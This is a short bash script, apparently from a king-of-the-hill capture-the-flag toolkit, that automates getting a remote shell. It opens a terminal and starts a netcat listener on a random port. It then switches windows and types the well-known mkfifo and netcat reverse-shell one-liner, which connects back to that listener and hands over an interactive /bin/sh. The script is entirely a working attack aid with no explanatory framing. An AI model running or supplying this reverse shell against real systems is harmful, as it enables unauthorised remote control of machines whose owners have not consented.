#!/bin/bash

source "/root/git/koth/scripts/functions.sh"

PORT=$(($RANDOM+3000))

hide_guake
qterminal
sleep 0.5
command "nc -lnvp $PORT"
alt_tab
command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
